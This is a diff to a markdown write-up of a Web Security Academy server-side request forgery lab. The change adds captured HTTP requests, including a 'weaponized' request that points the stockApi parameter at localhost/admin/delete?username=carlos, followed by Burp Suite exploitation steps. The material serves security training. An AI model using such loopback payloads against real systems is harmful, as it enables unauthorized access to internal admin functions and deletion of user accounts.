@@ -14,6 +14,37 @@ Access the internal administrative interface located at `http://localhost/admin`
   ```
 * **Vulnerability Mechanism:** The server blindly trusts the URL supplied in `stockApi` and executes the HTTP request from its own internal network context.
 
+## 📡 Traffic Capture Logs
+
+### 📥 Baseline Intercepted Request
+This traffic capture demonstrates the original application workflow fetching stock values from an absolute URL:
+
+```http
+POST /product/stock HTTP/2
+Host: 0a0b003804ae728c83a9967500eb00cb.web-security-academy.net
+Cookie: session=n0Gy8IEiKundaHW1fX43gUQajxJBNFY6
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+
+stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+```
+
+### 📤 Weaponized SSRF Exploit Target
+The modified payload forces the server to loop back internally and access administrative endpoints:
+
+```http
+POST /product/stock HTTP/2
+Host: 0a0b003804ae728c83a9967500eb00cb.web-security-academy.net
+Cookie: session=n0Gy8IEiKundaHW1fX43gUQajxJBNFY6
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+stockApi=http://localhost/admin/delete?username=carlos
+```
+
+
+
+
 ##  Exploitation Step-by-Step
 1. Browse to any product page and click the **Check stock** button while monitoring traffic in Burp Suite.
 2. Identify the `POST /product/stock` request in your **HTTP history** and send it to **Burp Repeater**.
